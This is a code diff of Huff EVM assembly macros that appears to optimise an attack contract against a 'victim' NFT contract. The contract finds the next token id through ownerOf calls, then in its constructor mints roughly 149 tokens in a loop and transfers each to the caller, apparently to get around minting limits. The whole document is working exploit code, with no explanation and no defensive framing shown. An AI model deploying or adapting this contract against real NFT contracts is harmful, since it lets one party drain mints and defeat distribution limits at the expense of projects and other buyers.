@@ -1,43 +1,41 @@
-#define macro IS_OWNED_LOOP() = takes(4) returns(4) {
+#define macro IS_OWNED_LOOP() = takes(2) returns(2) {
     // Loop over ownerOf checks until it fails, giving us starting token id
     is_owned:
         // mstore start
-        0x0c mstore                         // [victim, victim, start]
+        dup2 0x0c mstore                    // [victim, start]
 
         // ownerOf call
-        calldatasize 0x24 0x08              // [0x1c, 0x24, 0, victim, victim, start]
-        calldatasize swap4                  // [victim, 0x08, 0x24, 0, 0, victim, start]
-        gas staticcall                      // [success, victim, start]
+        calldatasize calldatasize 0x24 0x08 // [0x1c, 0x24, 0, 0, victim, start]
+        dup5 gas staticcall                 // [success, victim, start]
 
         // Increment start
-        swap2 0x01 add                      // [start + 1, victim, success]
-        dup2 swap1 dup1 swap4               // [success, start + 1, victim, victim, start + 1]
-    is_owned jumpi                          // [start + 1, victim, victim, start + 1]
+        dup3 add                            // [start + success, victim, start]
+        dup1 swap3 lt                       // [success, victim, start + success]
+    is_owned jumpi                          // [victim, start + success]
 }
 
 #define macro MINT_TRANSFER_LOOP() = takes(4) returns(4) {
     // Loop over mint and transfers
     next_iter:
         // mstore i
-        dup1 0x48 mstore                    // [i, end, victim, start]
+        dup1 0x48 mstore                    // [i, end, victim, success]
 
         // Mint
-        dup3 calldatasize 0x04 calldatasize calldatasize calldatasize swap5 
-                                            // [victim, 0, 0x04, 0, 0, 0, i, end, victim, start]
-        gas call                            // [success, i, end, victim, start]
+        calldatasize calldatasize 0x04 calldatasize calldatasize dup8
+                                            // [victim, 0, 0, 0x04, 0, 0, i, end, victim, success]
+        gas call                            // [success, i, end, victim, success]
 
         // Transfer
-        dup4 swap1                          // [success, victim, i, end, victim, start]
-        0x64 0x04 calldatasize calldatasize swap5           
-                                            // [victim, 0, 0x04, 0x64, success, 0, i, end, victim, start]
-        gas call                            // [success, i, end, victim, start]
+        calldatasize swap1 0x64 0x04 calldatasize dup8
+                                            // [victim, 0, 0x04, 0x64, success, 0, i, end, victim, success]
+        gas call                            // [success, i, end, victim, success]
 
         // Increment i
-        add                                 // [i + 1, end, victim, start]
+        add                                 // [i + 1, end, victim, success]
 
         // Get end > i + 1
-        dup1 dup3 gt                        // [end > i + 1, i + 1, end, victim, start]
-    next_iter jumpi                         // [i + 1, end, victim, start]
+        dup1 dup3 gt                        // [end > i + 1, i + 1, end, victim, success]
+    next_iter jumpi                         // [i + 1, end, victim, success]
 }
 
 #define macro CONSTRUCTOR() = takes(0) returns(0) {
@@ -51,33 +49,32 @@
     // mstore function selectors
     0x1249c58b23b872dd6352211e0000000000000000000000000000000000000000 returndatasize mstore  
                                             // [victim, start]
-    dup1 dup3                               // [start, victim, victim, start]
 
     IS_OWNED_LOOP()
 
     // mstore contract address
-    address 0x08 mstore                     // [start, victim, victim, start]
+    address 0x08 mstore                     // [victim, start]
 
     // mstore caller address
-    caller 0x28 mstore                      // [start, victim, victim, start]
+    caller 0x28 mstore                      // [victim, start]
 
     // Get end
-    dup1 0x94 add                           // [end, start, victim, victim, start]
+    dup2 0x95 add                           // [end, victim, start]
 
     // Initial mint
-    swap2 calldatasize 0x04 calldatasize calldatasize calldatasize swap5    
-                                            // [victim, 0, 0x04, 0, 0, 0, start, end, victim, start]
-    gas call swap1 sub                      // [i, end, victim, start]
+    calldatasize calldatasize 0x04 calldatasize calldatasize dup7    
+                                            // [victim, 0, 0, 0x04, 0, 0, end, victim, start]
+    gas call swap3                          // [start, end, victim, success]
 
     MINT_TRANSFER_LOOP()
 
-    // mstore start
-    0x48 mstore                             // [end, victim, start]
+    // mstore end
+    0x48 mstore                             // [end, victim, success]
 
     // Transfer initial nft
-    swap1 calldatasize 0x64 0x04 calldatasize calldatasize swap5    
-                                            // [victim, 0, 0x04, 0x64, 0, 0, i, end, start]
-    gas call                                // [success, end, start]
+    calldatasize calldatasize 0x64 0x04 calldatasize dup7
+                                            // [victim, 0, 0x04, 0x64, 0, 0, victim, success]
+    gas call                                // [success, victim, success]
 
     // Stop
     stop
